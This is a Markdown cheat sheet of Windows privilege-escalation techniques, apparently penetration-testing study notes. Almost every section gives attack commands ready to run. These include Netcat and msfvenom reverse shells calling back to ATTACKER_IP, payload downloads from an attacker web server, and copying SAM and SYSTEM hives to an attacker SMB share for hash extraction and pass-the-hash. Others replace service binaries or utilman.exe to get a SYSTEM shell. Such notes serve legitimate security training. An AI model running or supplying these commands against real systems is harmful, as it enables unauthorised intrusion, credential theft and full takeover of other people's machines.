#PrivEsc #Windows #tools 

System accounts that you might be able to get their privileges by exploiting specific services:

|   |   |
|---|---|
|**SYSTEM / LocalSystem**|An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.|
|**Local Service**|Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.|
|**Network Service**|Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.|

## Harvesting Passwords
##### Unattended Windows Installations Locations

Allows a single OS image to multiple host, my contain administrative credentials to perform the operation.

- `C:\Unattend.xml`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Unattend\Unattend.xml`
- `C:\Windows\system32\sysprep.inf`
- `C:\Windows\system32\sysprep\sysprep.xml`

##### Powershell History

`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` - See Powershell's history file trough CMD.

Change `%userprofile%` to `$Env:userprofile` if running the command trough Powershell.

##### Saved Windows credentials

`cmdkey /list` - List saved credentials.
`runas /savecred /user:<username> cmd.exe` - Run CMD with the rights of the user with the saved credentials.

##### ISS Configuration

Internet Information Services (IIS) is the default web server on Windows installations.

Possible locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString` - Find database connection strings on the file.

##### Retrieve Credentials from Software: PuTTY

PuTTY is a common SSH client on Windows systems, the proxy configuration can include clear text passwords.

`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` - Search the registry key for ProxyPassword.

Other software to check:

- Browsers
- Email clients
- FTP clients
- SSH clients
- VNC software

## Quick Wins

##### Scheduled Tasks

`schtasks` - List scheduled tasks.
`schtasks /query /tn <vulntask> /fo list /v` - Get Detailed information about a service.
`icacls <Path to scheduled task` - Check who has access F means full access.
`echo c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> <port> > C:\tasks\schtask.bat` - Change the binary contents with a reverse shell using Netcat.
`nc -lvp <port>` - Open a listener from the attacker machine.

##### AlwaysInstallElvated

Works if .msi files are configured to run with higher privileges than the user running them.

Both values should be set for this to work:

- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.75.206 LPORT=LOCAL_PORT -f msi -o malicious.msi` - Generate a malicious .msi file
2. Run Metasploit handler.
3. `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` - Run this command on the target machine to get the shell.

## Abusing Service Misconfiguration

##### Windows Services

Managed by the Service Control Manager(SCM), each service has an associated executable file which will run by the SCM using a special function when the service is started.

##### Insecure Permissions on Service Executables

Happens when a service executable has week DACL(Discretionary Access Control List) which allows you to modify or replace the file.

`sc qc <service name>` - Check service configuration.
`HKLM\SYSTEM\CurrentControlSet\Services\` Services configuration location on the registery.
`icacls <service path` - Check the permisions of the service executable file.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe-service -o rev-svc.exe` - Generate a reverse shell using Msfvenom.
`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe` - Get the file to the victim using Powershell.
`cd <service directory path>` - Go to the directory of the service.
`move <service file name>.exe <service file name>.exe.bkp` - Move the service file to a backup file.
`move <malicious service path> <service file name>.exe` - Move the malicious file to the current folder named after the legitimate service.
`icacls <service file name>.exe /grand Everyone:F` - Grant full permission to the Everyone group.
`nc -lvp <port>` - Start a reverse listener on the attacker machine.
`sc stop <service name>` than `sc start <service name>` - Restart the service (usually you want have the permissions and would need to wait for the service to restart by itself).

##### Unquoted Service Paths

When there are no quotations and a space in the name of a folder the command become ambiguous, for example if you execute `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` it can mean:

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

Since spaces are usually used as an argument separators the SCM will try to run the commands in the table from top to bottom.

The vulnerability only works if the installer changes the permission of the folder or if the administrator installs the binary into a non-default path which is world writable.

`sc qc <service name>` - Check service details.
`icacls <service folder>` -Check if you have permissions to write to this folder.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe-service -o rev-svc.exe` - Generate a reverse shell using Msfvenom.
`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe` - Get the file to the victim using Powershell (after setting up a python server).
`move <rev-svc.exe path> <Vulnerable path>` - Move the payload to the appropriate location for example to `C:\MyPrograms\Disk.exe` following the table above.
`icacls <service file name>.exe /grand Everyone:F` - Grant full permission to the Everyone group.
`nc -lvp <port>` - Start a reverse listener on the attacker machine.
`sc stop <service name>` than `sc start <service name>` - Restart the service (usually you want have the permissions and would need to wait for the service to restart by itself).

##### Insecure Service Permissions

Sometimes the service itself (not the executable) has week DACL(Discretionary Access Control List) which lets you modify the configuration, which allows you to reconfigure the service and point to any executable with the account you prefer including SYSTEM.

`accesschk64.exe -qlc <service name>` - Check a service DACL using accesschk from sysinternals suite.
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<port> -f exe-service -o rev-svc.exe` - Generate a reverse shell using Msfvenom.
`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe` - Get the file to the victim using Powershell (after setting up a python server).
`icacls <service file name>.exe /grand Everyone:F` - Grant full permission to the Everyone group.
`sc config <service name> binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem` - Change the service associated executable and account.
`nc -lvp <port>` - Start a reverse listener on the attacker machine.
`sc stop <service name>` than `sc start <service name>` - Restart the service (usually you want have the permissions and would need to wait for the service to restart by itself).

## Abusing Dangerous Privileges

`whoami /priv` - Check your assigned privileges.

##### SeBackup / SeRestore

Those privileges allows users from the Backup Operators group to read and write to any file on the system ignoring DACL, so those users can perform backups without full administrative privileges. One way of abusing it is by copying the SAM and SYSTEM registry hives and extract the local administrator's password hash.

**Open CMD as administrator**

`reg save hklm\system C:\Users\<username>\System.hive` and `reg save hklm\sam C:\Users\<username>\sam.hive` - Backup the SAM and SYSTEM hashes.

**Copy the files to your machine, for example by using Impacket's SMB**

On the attacker machine:
`mkdir share` - Create a directory to share.
`python3.9 <smbserver.py file path> -smb2support -username <username> -password <password> public share` - Create a share named public pointing to the share directory.

`copy <sam.hive backuped file path> \\<attacker ip>\public\` and `copy <system.hive backuped file path> \\<attacker ip>\public\` Copy the files to the share, on the victim machine.

`python3.9 secretsdump.py -sam sam.hive -system system.hive` - Use impacket to retrieve the users' password hashes.
`python3.9 <psexec.py file path> -hashes <administrator's hash> administrator@<target ip address>` - Finally perform a Pass-the-Hash attack to gain access to the machine with SYSTEM privileges.

##### SeTakeOwnership

This privilege allows the user to take ownership of any object on the system, including files and registry keys.
We'll abuse utilman.exe which is a built-in application that runs with SYSTEM privileges to provide ease of access services in the lock screen.

`takeown /f C:\Windows\System32\utilman.exe` - Take ownership of the file.
`icacls C:\Windows\System32\utilman.exe /grant <username>:F` - Assign yourself full privileges to the file.
`copy cmd.exe utilman.exe` - Replace utilman.exe with a copy of cmd.exe.

Now lock your screen and click on Ease of Access, it'll open CMD with SYSTEM privileges.

##### SeImpersonate / SeAssignPrimaryToken

Those privileges lets the service to impersonate other users, for example to assign them access with their token to their files (FTP).
You can pass the RogueWinRM exploit to the victim machine and use it since, when a user starts the BITS service its creating a connection to port 5985 with the SYSTEM privileges which is usually the port for WinRM (Which exposes a Powershell console to be used remotely), if WinRM isn't running it's possible to start a fake WinRM service and capture the authentication attempt made by BITS.

`nc -lvp <port>` - Start a listener on the attacker machine.
`<RogueWinRM.exe path> -p <nc64.exe path> -a "-e cmd.exe <attacker ip> <port>"` - Trigger the exploit with the Netcat binary and the arguments following `-a`.

##### Unpatched software

`wmic product get name,version,vendor` - List information for installed programs (Doesn't always list all programs).

Websites to check for exploits:

- [exploit-db](https://www.exploit-db.com/)
- [packet storm](https://packetstormsecurity.com/)

## Enumeration Tools

##### WinPEAS

`winpeas.exe > output.exe` - Run the script on the target machine to enumerate the machine and direct the output to a file.

##### PrivescCheck

Powershell script that unlike WinPEAS doesn't require an execution of a binary file.

Bypass execution policy restrictions to run the tool (not always needed) and enumerate the target:

1. `Set-ExecutionPolicy Bypass -Scope process -Force`
2. `. .\PrivescCheck.ps1`
3. `Invoke-PrivescCheck`

##### WES-NG

Can run on the attacker machine those creating less noise.

`wes.py --update` - Update the database

Now run `systeminfo` on the target machine, copy the output to a file than run `wes.py <filename>.txt` to enumerate the target.

##### Metasploit

`multi/recon/local_exploit_suggester` - Module to run to enumerate the target in case you you already have a Meterpreter shell.